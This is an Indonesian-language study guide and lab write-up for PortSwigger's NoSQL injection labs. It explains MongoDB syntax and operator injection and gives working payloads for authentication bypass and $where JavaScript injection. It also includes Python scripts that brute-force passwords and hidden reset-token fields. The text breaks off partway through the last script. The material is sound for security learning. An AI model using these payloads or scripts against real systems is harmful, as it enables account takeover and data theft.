# NoSQL Injection — PortSwigger Web Security Academy

[🇬🇧 Read in English](nosql-injection-en.md)

﷽

## Apa Ini?

![nosql-injection](images/overview/nosql-injection.png)

Learning path ini membahas deteksi, eksploitasi, dan pencegahan kerentanan NoSQL injection. Kamu akan mempelajari perbedaan antara NoSQL dan SQL injection, cara melakukan NoSQL syntax injection, dan cara menggunakan operator NoSQL untuk memanipulasi kueri.

## Apa Itu NoSQL Injection?

NoSQL injection adalah kerentanan ketika penyerang dapat mengganggu kueri yang dibuat aplikasi ke database NoSQL. NoSQL injection dapat memungkinkan penyerang untuk:

- Melewati mekanisme autentikasi atau proteksi.
- Mengekstrak atau mengubah data.
- Menyebabkan denial of service.
- Mengeksekusi kode di server.

Database NoSQL menyimpan dan mengambil data dalam format selain tabel relasional SQL tradisional. Mereka menggunakan berbagai bahasa kueri, bukan standar universal seperti SQL, dan memiliki lebih sedikit batasan relasional.

## Jenis-Jenis NoSQL Injection

Ada dua jenis NoSQL injection:

- **Syntax injection** - Terjadi ketika kamu dapat merusak sintaks kueri NoSQL, sehingga bisa menyisipkan payload sendiri. Metodologinya mirip dengan SQL injection. Namun sifat serangannya sangat berbeda, karena database NoSQL menggunakan berbagai bahasa kueri, jenis sintaks kueri, dan struktur data yang berbeda.

- **Operator injection** - Terjadi ketika kamu dapat menggunakan operator kueri NoSQL untuk memanipulasi kueri.

Di topik ini, kita akan melihat cara menguji kerentanan NoSQL secara umum, lalu fokus pada masing-masing jenis.

### NoSQL Syntax Injection

Kamu berpotensi mendeteksi kerentanan NoSQL injection dengan mencoba merusak sintaks kueri. Untuk melakukannya, uji setiap input secara sistematis dengan mengirimkan fuzz string dan karakter khusus yang memicu error database atau perilaku lain yang dapat dideteksi jika input tidak disanitasi atau difilter dengan benar oleh aplikasi.

Jika kamu mengetahui bahasa API dari database target, gunakan karakter khusus dan fuzz string yang relevan dengan bahasa tersebut. Jika tidak, gunakan berbagai fuzz string untuk menargetkan beberapa bahasa API.

#### Mendeteksi Syntax Injection di MongoDB

Pertimbangkan aplikasi belanja yang menampilkan produk dalam kategori berbeda. Ketika pengguna memilih kategori *Fizzy drinks*, browser mereka meminta URL berikut:

```url
https://insecure-website.com/product/lookup?category=fizzy
```

Ini menyebabkan aplikasi mengirim kueri JSON untuk mengambil produk relevan dari koleksi `product` di database MongoDB:

```sql
this.category == 'fizzy'
```

Untuk menguji apakah input mungkin rentan, kirimkan fuzz string pada nilai parameter `category`. Contoh string untuk MongoDB adalah:

```sql
' "`{
;$Foo}
$Foo \xYZ
```

Gunakan fuzz string ini untuk membangun serangan berikut:

```url
https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
```

Jika ini menyebabkan perubahan dari respons asli, ini dapat mengindikasikan bahwa input pengguna tidak difilter atau disanitasi dengan benar.

>Catatan: Kerentanan NoSQL injection dapat terjadi dalam berbagai konteks, dan kamu perlu menyesuaikan fuzz string. Jika tidak, kamu mungkin hanya memicu error validasi yang membuat aplikasi tidak pernah mengeksekusi kuerimu.

Pada contoh ini, kita menyuntikkan fuzz string melalui URL, sehingga string di-URL-encode. Di beberapa aplikasi, kamu mungkin perlu menyuntikkan payload yang menjadi *'\"`{\r;$Foo}\n$Foo \\xYZ\u0000`*.

#### Menentukan Karakter Mana yang Diproses

Untuk menentukan karakter mana yang diinterpretasikan sebagai sintaks oleh aplikasi, kamu dapat menyuntikkan karakter satu per satu. Misalnya, kamu bisa mengirim `'`, yang menghasilkan kueri MongoDB berikut:

```sql
this.category == '''
```

Jika ini menyebabkan perubahan dari respons asli, ini dapat mengindikasikan bahwa karakter `'` telah merusak sintaks kueri dan menyebabkan syntax error. Kamu dapat mengonfirmasinya dengan mengirimkan string kueri yang valid pada input, misalnya dengan meng-escape tanda kutip:

```sql
this.category == '\''
```

Jika ini tidak menyebabkan syntax error, ini dapat berarti aplikasi rentan terhadap serangan injeksi.

#### Mengonfirmasi Perilaku Kondisional

Setelah mendeteksi kerentanan, langkah berikutnya adalah menentukan apakah kamu dapat memengaruhi kondisi boolean menggunakan sintaks NoSQL.

Untuk mengujinya, kirim dua permintaan: satu dengan kondisi false dan satu dengan kondisi true. Misalnya kamu bisa menggunakan pernyataan kondisional `' && 0 && 'x` dan `' && 1 && 'x` sebagai berikut:

```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x
```
```
https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x
```

Jika aplikasi berperilaku berbeda, ini menunjukkan bahwa kondisi false memengaruhi logika kueri, tetapi kondisi true tidak. Ini mengindikasikan bahwa menyuntikkan sintaks dengan gaya ini memengaruhi kueri di sisi server.

#### Menimpa Kondisi yang Ada

Setelah kamu mengidentifikasi bahwa kamu dapat memengaruhi kondisi boolean, kamu dapat mencoba menimpa kondisi yang ada untuk mengeksploitasi kerentanan. Misalnya, kamu dapat menyuntikkan kondisi JavaScript yang selalu bernilai true, seperti `'||'1'=='1`:

```url
https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31
```

Ini menghasilkan kueri MongoDB berikut:

```sql
this.category == 'fizzy'||'1'=='1'
```

Karena kondisi yang disuntikkan selalu true, kueri yang dimodifikasi mengembalikan semua item. Ini memungkinkan kamu melihat semua produk di kategori mana pun, termasuk kategori tersembunyi atau tidak diketahui.

> Peringatan: Berhati-hatilah saat menyuntikkan kondisi yang selalu bernilai true ke dalam kueri NoSQL. Meskipun ini mungkin tidak berbahaya dalam konteks awal injeksi, aplikasi sering menggunakan data dari satu permintaan dalam beberapa kueri berbeda. Jika aplikasi menggunakannya saat memperbarui atau menghapus data, misalnya, ini dapat mengakibatkan kehilangan data yang tidak disengaja.

#### Menimpa Kondisi yang Ada - Lanjutan

Kamu juga bisa menambahkan karakter null setelah nilai kategori. MongoDB mungkin mengabaikan semua karakter setelah karakter null. Ini berarti kondisi tambahan pada kueri MongoDB akan diabaikan. Misalnya, kueri mungkin memiliki batasan tambahan `this.released`:

```sql
this.category == 'fizzy' && this.released == 1
```

Batasan `this.released == 1` digunakan untuk hanya menampilkan produk yang sudah dirilis. Untuk produk yang belum dirilis, diasumsikan `this.released == 0`.

Dalam kasus ini, penyerang dapat membangun serangan sebagai berikut:

```url
https://insecure-website.com/product/lookup?category=fizzy'%00
```

Ini menghasilkan kueri NoSQL berikut:

```sql
this.category == 'fizzy'\u000' && this.released == 1
```

Jika MongoDB mengabaikan semua karakter setelah karakter null, persyaratan field released bernilai 1 akan dihapus. Akibatnya, semua produk dalam kategori `fizzy` ditampilkan, termasuk produk yang belum dirilis.

##### Lab: Detecting NoSQL Injection

Filter kategori produk untuk lab ini didukung oleh database MongoDB NoSQL. Filter ini rentan terhadap NoSQL injection.

Untuk menyelesaikan lab, lakukan serangan NoSQL injection yang menyebabkan aplikasi menampilkan produk yang belum dirilis.

<details>
<summary>Detail lab, screenshot & walkthrough 0.1</summary>

![Open labs 0.1](images/lab-0.1-detecting-nosql-injection/01-open-labs-0.1.png)

![Open parameter Gift 0.1](images/lab-0.1-detecting-nosql-injection/02-open-gift-parameter-0.1.png)

![Send to repeater 0.1](images/lab-0.1-detecting-nosql-injection/03-send-to-repeater-0.1.png)

![Test single quote 0.1](images/lab-0.1-detecting-nosql-injection/04-test-single-quote-0.1.png)

![Test '+' comment 0.1](images/lab-0.1-detecting-nosql-injection/05-test-plus-comment-0.1.png)

![use URL encode '+' 0.1](images/lab-0.1-detecting-nosql-injection/06-url-encode-plus-0.1.png)

![Testing false boolean condition 0.1](images/lab-0.1-detecting-nosql-injection/07-false-boolean-condition-0.1.png)

![URL encode payload 0.1](images/lab-0.1-detecting-nosql-injection/08-url-encode-payload-0.1.png)

![Result true boolean condition 0.1](images/lab-0.1-detecting-nosql-injection/09-true-boolean-condition-0.1.png)

![Try always-true payload ||1|| 0.1](images/lab-0.1-detecting-nosql-injection/10-always-true-payload-0.1.png)

![Open response in browser 0.1](images/lab-0.1-detecting-nosql-injection/11-open-response-in-browser-0.1.png)

![Copy response URL to browser 0.1](images/lab-0.1-detecting-nosql-injection/12-copy-response-url-0.1.png)

![Success finish labs 0.1](images/lab-0.1-detecting-nosql-injection/13-lab-solved-0.1.png)

##### Tutorial

1. Buka parameter Gifts lalu kirim ke Repeater.
2. Coba masukkan tanda kutip tunggal `'`, pastikan respons mengeluarkan error.
3. Coba masukkan `'+'` untuk komentar; jika respons error, ubah/convert ke URL encoding `'%2b'` dan pastikan halaman kembali normal.
4. Berikan kondisi boolean:
```sql
' && 0 && 'x # true
' && 1 && 'x # false
```
5. Jika respons error karena payload tidak diparsing sebagai kode JS, ubah/convert ke URL encoding:
```url
'+%26%26+0+%26%26+'x
'+%26%26+1+%26%26+'x 
```
6. Coba kondisi boolean selalu true:
```sql
'||1||'
```
7. Lab selesai.

##### Referensi

<details>
<summary> Portswigger - NoSQL injection - Lab #1 Detecting NoSQL injection — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=Z1eaH0zi7mk
Tujuan: Video ini menunjukkan cara mengeksploitasi dan menemukan kerentanan NoSQL injection pada lab Web Security Academy (PortSwigger).
</details>

</details>

### NoSQL Operator Injection

Database NoSQL sering menggunakan operator kueri, yang menyediakan cara untuk menentukan kondisi yang harus dipenuhi data agar disertakan dalam hasil kueri. Contoh operator kueri MongoDB meliputi:

- `$where` - Mencocokkan dokumen yang memenuhi ekspresi JavaScript.
- `$ne` - Mencocokkan semua nilai yang tidak sama dengan nilai tertentu.
- `$in` - Mencocokkan semua nilai yang ditentukan dalam sebuah array.
- `$regex` - Memilih dokumen di mana nilai cocok dengan regular expression tertentu.

Kamu mungkin dapat menyuntikkan operator kueri untuk memanipulasi kueri NoSQL. Untuk melakukannya, kirimkan berbagai operator secara sistematis ke berbagai input pengguna, lalu tinjau respons untuk pesan error atau perubahan lainnya.

#### Mengirimkan Query Operator

Dalam pesan JSON, kamu dapat menyisipkan operator kueri sebagai objek bersarang. Misalnya, `{"username":"wiener"}` menjadi `{"username":{"$ne":"invalid"}}`.

Untuk input berbasis URL, kamu dapat menyisipkan operator kueri melalui parameter URL. Misalnya, `username=wiener` menjadi `username[$ne]=invalid`. Jika ini tidak berhasil, kamu bisa mencoba:

1. Ubah metode request dari `GET` menjadi `POST`.
2. Ubah header `Content-Type` menjadi `application/json`.
3. Tambahkan JSON ke body pesan.
4. Suntikkan operator kueri di JSON.

>Catatan: Kamu dapat menggunakan ekstensi Content Type Converter untuk mengonversi metode request secara otomatis dan mengubah request `POST` URL-encoded menjadi JSON.

#### Mendeteksi Operator Injection di MongoDB

Pertimbangkan aplikasi rentan yang menerima username dan password di body request `POST`:

```json
{"username":"wiener", "password":"peter"}
```

Uji setiap input dengan berbagai operator. Misalnya, untuk menguji apakah input username memproses operator kueri, kamu bisa mencoba injeksi berikut:

```json
{"username":{"$ne":"invalid"},"password":"peter"}
```

Jika operator `$ne` diterapkan, ini akan menanyakan semua pengguna dengan username yang tidak sama dengan `invalid`.

Jika input username dan password sama-sama memproses operator, mungkin memungkinkan untuk melewati autentikasi menggunakan payload berikut:

```json
{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
```

Kueri ini mengembalikan semua kredensial login di mana username dan password tidak sama dengan `invalid`. Akibatnya, kamu masuk ke aplikasi sebagai pengguna pertama dalam koleksi.

Untuk menargetkan akun tertentu, kamu dapat membuat payload yang menyertakan username yang diketahui atau yang kamu tebak. Misalnya:

```json
{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
```

##### Lab: Exploiting NoSQL Operator Injection to Bypass Authentication

Fungsionalitas login untuk lab ini didukung oleh database MongoDB NoSQL. Fitur ini rentan terhadap NoSQL injection menggunakan operator MongoDB.

<details>
<summary>Detail lab, screenshot & walkthrough 0.2</summary>

Untuk menyelesaikan lab, login ke aplikasi sebagai pengguna `administrator`. Kamu dapat login ke akun sendiri menggunakan kredensial berikut: `wiener:peter`.

![Open labs 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/01-open-labs-0.2.png)

![Login as wiener:peter 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/02-login-as-wiener-0.2.png)

![Send login request to repeater 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/03-send-login-to-repeater-0.2.png)

![Response location shows wiener 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/04-response-location-wiener-0.2.png)

![Inject $regex w and $ne to match wiener 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/05-regex-w-ne-returns-wiener-0.2.png)

![Inject $regex a returns unexpected number of records 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/06-regex-a-unexpected-records-0.2.png)

![Inject $regex ad returns administrator account 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/07-regex-ad-returns-admin-0.2.png)

![Response redirect used to access admin session 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/08-response-redirect-admin-0.2.png)

![Open response in browser 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/09-open-response-in-browser-0.2.png)

![Successfully logged in as administrator 0.2](images/lab-0.2-exploiting-nosql-operator-injection-bypass-authentication/10-lab-solved-admin-login-0.2.png)

##### Tutorial

1. Buka `/login` dan login sebagai pengguna `wiener`, lalu kirim request dari HTTP history ke Repeater.
2. Pada request, ubah `username` dan `password` menjadi nilai parameter JSON.
```json
{
    "username":"wiener",
    "password":"peter"
}
```
3. Coba gunakan operator `regex` dan `ne` MongoDB untuk bypass autentikasi.

```json
{
    "username":{"$regex":"w"},
    "password":{"$ne":""}
}
{
    "username":{"$regex":"ad"},
    "password":{"$ne":""}
}
```
4. Tampilkan respons di browser (show response in browser).
5. Berhasil login sebagai administrator melalui bypass autentikasi.

##### Referensi

<details>
<summary> Portswigger - NoSQL injection - Lab #2 Exploiting NoSQL operator injection to bypass authentication — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=KaCUvVIOXvE
Tujuan: Video ini menunjukkan cara mengeksploitasi NoSQL operator injection untuk bypass autentikasi pada lab Web Security Academy (PortSwigger).
</details>

</details>

### Mengeksploitasi Syntax Injection untuk Mengekstrak Data

Di banyak database NoSQL, beberapa operator atau fungsi kueri dapat menjalankan kode JavaScript terbatas, seperti operator `$where` dan fungsi `mapReduce()` di MongoDB. Ini berarti, jika aplikasi rentan menggunakan operator atau fungsi ini, database dapat mengevaluasi JavaScript sebagai bagian dari kueri. Oleh karena itu, kamu mungkin dapat menggunakan fungsi JavaScript untuk mengekstrak data dari database.

#### Mengekfiltrasi Data di MongoDB

Pertimbangkan aplikasi rentan yang memungkinkan pengguna mencari username terdaftar lain dan menampilkan perannya. Ini memicu request ke URL:

```url
https://insecure-website.com/user/lookup?username=admin
```

Ini menghasilkan kueri NoSQL berikut pada koleksi `users`:

```JavaScript
{"$where":"this.username == 'admin'"}
```

Karena kueri menggunakan operator `$where`, kamu dapat mencoba menyuntikkan fungsi JavaScript ke dalam kueri ini agar mengembalikan data sensitif. Misalnya, kamu bisa mengirim payload berikut:

```JavaScript
admin' && this.password[0] == 'a' || 'a'=='b
```

Ini mengembalikan karakter pertama dari string password pengguna, memungkinkan kamu mengekstrak password karakter demi karakter. Kamu juga dapat menggunakan fungsi JavaScript `match()` untuk mengekstrak informasi. Misalnya, payload berikut memungkinkan kamu mengidentifikasi apakah password mengandung digit:

```JavaScript
admin' && this.password.match(/\d/) || 'a'=='b
```

#### Mengidentifikasi Nama Field

Karena MongoDB menangani data semi-terstruktur yang tidak memerlukan skema tetap, kamu mungkin perlu mengidentifikasi field yang valid dalam koleksi sebelum dapat mengekstrak data menggunakan JavaScript injection.

Misalnya, untuk mengidentifikasi apakah database MongoDB berisi field `password`, kamu bisa mengirimkan payload berikut:

```url
https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'
```

Kirim payload lagi untuk field yang ada dan untuk field yang tidak ada. Pada contoh ini, kamu tahu field `username` ada, jadi kamu bisa mengirim payload berikut:

```JavaScript
admin' && this.username!='
admin' && this.foo!='
```

Jika field `password` ada, kamu mengharapkan respons identik dengan respons untuk field yang ada (`username`), tetapi berbeda dengan respons untuk field yang tidak ada (`foo`).

#### Mengidentifikasi Nama Field - Lanjutan

Jika kamu ingin menguji berbagai nama field, kamu dapat melakukan dictionary attack dengan menggunakan wordlist untuk mencoba nama field potensial.

>Catatan: Sebagai alternatif, kamu dapat menggunakan NoSQL operator injection untuk mengekstrak nama field karakter demi karakter. Ini memungkinkan kamu mengidentifikasi nama field tanpa harus menebak atau melakukan dictionary attack. Ini akan dibahas di bagian berikutnya.

##### Lab: Exploiting NoSQL Injection to Extract Data

Fungsionalitas pencarian pengguna (user lookup) untuk lab ini didukung oleh database MongoDB NoSQL. Fitur ini rentan terhadap NoSQL injection.

<details>
<summary>Detail lab, screenshot & walkthrough 0.3</summary>

Untuk menyelesaikan lab, ekstrak password pengguna `administrator`, lalu login ke akunnya. Kamu dapat login ke akun sendiri menggunakan kredensial berikut: `wiener:peter`.

>Catatan: Password hanya menggunakan huruf kecil (lowercase).

![Open lab 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/01-open-lab-0.3.png)

![Login as wiener and open My Account 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/02-login-wiener-my-account-0.3.png)

![User lookup request for wiener 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/03-user-lookup-wiener-request-0.3.png)

![Lookup administrator returns user details 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/04-lookup-administrator-response-0.3.png)

![Single quote injection causes error 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/05-single-quote-error-0.3.png)

![URL-encoded plus restores valid response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/06-url-encoded-plus-bypass-0.3.png)

![False boolean condition returns no user 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/07-false-boolean-condition-0.3.png)

![True boolean condition returns administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/08-true-boolean-condition-0.3.png)

![Test password length greater than 1 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/09-password-length-greater-than-1-0.3.png)

![Intruder setup for password length testing 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/10-intruder-password-length-setup-0.3.png)

![Intruder results identify password length 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/11-intruder-password-length-results-0.3.png)

![Password length match response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/12-password-length-match-response-0.3.png)

![Password length mismatch response 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/13-password-length-no-match-response-0.3.png)

![Test password character at index 0 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/14-test-password-char-index-0-0.3.png)

![Cluster bomb positions for character extraction 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/15-cluster-bomb-positions-0.3.png)

![Cluster bomb charset payload list 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/16-cluster-bomb-charset-payload-0.3.png)

![Select cluster bomb attack type 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/17-select-cluster-bomb-attack-0.3.png)

![Python extraction script 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/18-python-extraction-script-0.3.png)

![Python extraction script (continued) 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/19-python-extraction-script-part-2-0.3.png)

![Python script output extracts password 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/20-python-script-output-password-0.3.png)

![Intruder results for character extraction 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/21-intruder-char-extraction-results-0.3.png)

![Login as administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/22-login-as-administrator-0.3.png)

![Lab solved as administrator 0.3](images/lab-0.3-exploiting-nosql-injection-extract-data/23-lab-solved-administrator-0.3.png)

##### Tutorial

Login sebagai `wiener:peter`, cari parameter user lookup, lalu ubah ke `administrator` untuk melihat informasi yang bocor di respons.

```JavaScript
administrator' # input tanda kutip tunggal untuk melihat perilaku
administrator'%2b' # uji input [+], %2b karena URL encoding
administrator'+%26%26+'1'%3d%3d'2 # uji kondisi false 1==2
administrator'+%26%26+'2'%3d%3d'2 # uji kondisi true 2==2
administrator'+%26%26+this.password.length+>+1+||+'a'%3d%3d'b # cek panjang password > 1
administrator'+%26%26+this.password.length+>+7+||+'a'%3d%3d'b # panjang password > 7 (true)
administrator'+%26%26+this.password.length+>+8+||+'a'%3d%3d'b # panjang password > 8 (false), jadi panjang 8
administrator'+%26%26+this.password[0]%3d%3d'w # brute-force karakter posisi 0 -> w
administrator'+%26%26+this.password[1]%3d%3d'l # posisi 1 -> l
administrator'+%26%26+this.password[2]%3d%3d'n # posisi 2 -> n
administrator'+%26%26+this.password[3]%3d%3d'p # posisi 3 -> p
administrator'+%26%26+this.password[4]%3d%3d'q # posisi 4 -> q
administrator'+%26%26+this.password[5]%3d%3d'p # posisi 5 -> p
administrator'+%26%26+this.password[6]%3d%3d'h # posisi 6 -> h
administrator'+%26%26+this.password[7]%3d%3d'm # posisi 7 -> m
administrator'+%26%26+this.password[8]%3d%3d'a # tidak ditemukan
```

Gunakan skrip Python (Intruder cluster bomb lebih lambat untuk brute-force):

```python
import requests
import string
import urllib.parse

URL = "https://0aa3005c03c734b880a20d92003c00a6.web-security-academy.net/user/lookup"

COOKIES = {
    "session": "Fi366QGOq8168ec11A8dD0nyBWZEpC4a"
}

HEADERS = {
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*"
}

CHARSET = string.ascii_lowercase + string.digits

def check(payload):
    response = requests.get(
        URL,
        params={"user": payload},
        cookies=COOKIES,
        headers=HEADERS
    )
    return response.status_code == 200 and "administrator" in response.text

def extract_password():
    password = ""

    for length in range(1, 65):
        payload = f"administrator' && this.password.length == {length} || 'a'=='b"

        if check(payload):
            print(f"[+] Password length: {length}")
            break
    else:
        print("[-] Password length not found")
        return

    for index in range(length):
        for char in CHARSET:
            payload = (
                f"administrator' && "
                f"this.password[{index}] == '{char}' || 'a'=='b"
            )

            if check(payload):
                password += char
                print(f"[+] {index}: {char} | {password}")
                break
        else:
            print(f"[-] Character at index {index} not found")
            return

    print(f"\n[+] Password: {password}")

if __name__ == "__main__":
    extract_password()
```
```bash
printf '%s\n' {a..z} {A..Z} {1..9} > charset.txt
```

Contoh hasil di Intruder:

```text
177	0	w	200	175	false	false	209	
90	1	l	200	176	false	false	209	
107	2	n	200	307	false	false	209	
124	3	p	200	175	false	false	209	
133	4	q	200	174	false	false	209	
126	5	p	200	174	false	false	209	
63	6	h	200	175	false	false	209	
104	7	m	200	175	false	false	209	
```

Berhasil login sebagai `administrator` dengan password `wlnpqphm`.

##### Referensi

<details>
<summary> Portswigger - NoSQL injection - Lab #3 Exploiting NoSQL injection to extract data — Popo Hack</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=tyRjEuj8sf4
Tujuan: Video ini menunjukkan cara mengeksploitasi NoSQL injection untuk mengekstrak data pada lab Web Security Academy (PortSwigger).
</details>

</details>

### Mengeksploitasi NoSQL Operator Injection untuk Mengekstrak Data

Meskipun kueri asli tidak menggunakan operator yang memungkinkan kamu menjalankan JavaScript arbitrer, kamu mungkin dapat menyuntikkan salah satu operator tersebut sendiri. Kamu kemudian dapat menggunakan kondisi boolean untuk menentukan apakah aplikasi mengeksekusi JavaScript yang kamu suntikkan melalui operator ini.

#### Menyuntikkan Operator di MongoDB

Pertimbangkan aplikasi rentan yang menerima username dan password di body request `POST`:

```json
{
    "username":"wiener",
    "password":"peter"
}
```

Untuk menguji apakah kamu dapat menyuntikkan operator, kamu bisa mencoba menambahkan operator `$where` sebagai parameter tambahan, lalu kirim satu request dengan kondisi bernilai false dan satu lagi bernilai true. Misalnya:

```json
{
    "username":"wiener",
    "password":"peter",
    "$where":"0"
}
```
```json
{
    "username":"wiener",
    "password":"peter",
    "$where":"1"
}
```

#### Mengekstrak Nama Field

Jika kamu telah menyuntikkan operator yang memungkinkan menjalankan JavaScript, kamu mungkin dapat menggunakan metode `keys()` untuk mengekstrak nama field data. Misalnya, kamu bisa mengirim payload berikut:

```json
"$where":"Object.keys(this)[0].match('^.{0}a.*')"
```

Ini memeriksa field data pertama pada objek pengguna dan mengembalikan karakter pertama dari nama field. Ini memungkinkan kamu mengekstrak nama field karakter demi karakter.

#### Mengekfiltrasi Data Menggunakan Operator

Sebagai alternatif, kamu mungkin dapat mengekstrak data menggunakan operator yang tidak memungkinkan menjalankan JavaScript. Misalnya, kamu dapat menggunakan operator `$regex` untuk mengekstrak data karakter demi karakter.

Pertimbangkan aplikasi rentan yang menerima username dan password di body request `POST`. Misalnya:

```json
{
    "username":"myuser",
    "password":"mypass"
}
```

Kamu bisa mulai dengan menguji apakah operator `$regex` diproses sebagai berikut:

```json
{
    "username":"admin",
    "password":{"$regex":"^.*"}
}
```

Jika respons terhadap request ini berbeda dengan respons saat kamu mengirim password salah, ini mengindikasikan aplikasi mungkin rentan. Kamu dapat menggunakan operator `$regex` untuk mengekstrak data karakter demi karakter. Misalnya, payload berikut memeriksa apakah password diawali huruf `a`:

```json
{
    "username":"admin",
    "password":{"$regex":"^a.*"}
}
```

##### Lab: Exploiting NoSQL Operator Injection to Extract Unknown Fields

Fungsionalitas pencarian pengguna untuk lab ini didukung oleh database MongoDB NoSQL. Fitur ini rentan terhadap NoSQL injection.

<details>
<summary>Detail lab, screenshot & walkthrough 0.4</summary>

Untuk menyelesaikan lab, login sebagai `carlos`.

>Tips: Untuk menyelesaikan lab, kamu perlu terlebih dahulu mengekfiltrasi nilai token reset password untuk pengguna `carlos`.

![Open lab 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/01-open-lab-0.4.png)

![Send login request for carlos in Repeater (invalid password) 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/02-send-login-carlos-repeater-0.4.png)

![Inject $ne password and $where false condition returns invalid credentials 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/03-where-false-invalid-credentials-0.4.png)

![Inject $where true condition triggers account locked response 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/04-where-true-account-locked-0.4.png)

![Open forgot password page and submit carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/05-forgot-password-carlos-0.4.png)

![Password reset email confirmation 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/06-reset-email-confirmation-0.4.png)

![Enumerate object keys and extract changePwd token value 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/07-enumerate-keys-extract-changepwd-token-0.4.png)

![Use extracted changePwd token in forgot-password request 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/08-use-changepwd-token-forgot-password-0.4.png)

![Set new password for carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/09-set-new-password-carlos-0.4.png)

![Login as carlos with new password 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/10-login-carlos-new-password-0.4.png)

![Lab solved as carlos 0.4](images/lab-0.4-exploiting-nosql-operator-injection-unknown-fields/11-lab-solved-carlos-0.4.png)

##### Tutorial

1. Buka My account, kirim request login `carlos` ke Repeater dan lihat respons password salah.
2. Coba injeksikan operator `$ne` pada password dan `$where` untuk melihat perbedaan respons:

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"0"}
{"username":"carlos","password":{"$ne": "test"},"$where":"1"}
{"username":"carlos","password":{"$ne": "test"},"$where":"Object.keys(this)[1].match('^.{0}a.*')"}
```

3. Brute-force untuk menemukan nama key/field tersembunyi:

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"Object.keys(this)[1].match('^.{0}a.*')"}
```

```python
#!/usr/bin/env python3
import re
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a15008a04a7e85680728a1d00400087.web-security-academy.net/login"
COOKIE = {"session": "Jdhkvf2nza8PiGWgmb9kaPBEsZju55Vj"}
CHARSET = string.ascii_letters + string.digits + "_-"

def is_true(r):
    if r.status_code in (301, 302, 303, 307, 308):
        return True
    return "invalid username or password" not in r.text.lower()

s = requests.Session()
s.verify = False
s.headers.update({"Content-Type": "application/json"})
s.cookies.update(COOKIE)

for idx in range(6):
    name = ""
    for pos in range(30):
        hit = None
        for ch in CHARSET:
            payload = {
                "username": "carlos",
                "password": {"$ne": "test"},
                "$where": f"Object.keys(this)[{idx}].match('^.{{{pos}}}{re.escape(ch)}.*')",
            }
            if is_true(s.post(URL, json=payload, allow_redirects=False, timeout=10)):
                hit = ch
                name += ch
                print(f"\rkey[{idx}] = {name}", end="", flush=True)
                break
        if not hit:
            break
    print(f"\rkey[{idx}] = {name or '-'}")
```

4. Setelah menemukan key tersembunyi (mis. `changePwd`), brute-force panjang dan nilainya:

```json
{"username":"carlos","password":{"$ne": "test"},"$where":"this.changePwd.match('^.{0}a.*')"}
```

```python
#!/usr/bin/env python3
import re
import string
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://0a15008a04a7e85680728a1d00400087.web-security-academy.net/login"
COOKIE = {"session": "Jdhkvf2nza8PiGWgmb9kaPBEsZju55Vj"}
FIELD = "changePwd"
CHARSET = string.ascii_letters + string.digits

def is_true(r):
    if r.status_code in (301, 302, 303, 307, 308):
        return True
    return "invalid username or password" not in r.text.lower()

s = requests.Session()
s.verify = False
s.headers.update({"Content-Type": "application/json"})
s.cookies.update(COOKIE)

# length
length = None
for i in range(1, 51):
    payload = {
        "username": "carlos",
        "password": {"$ne": "test"},
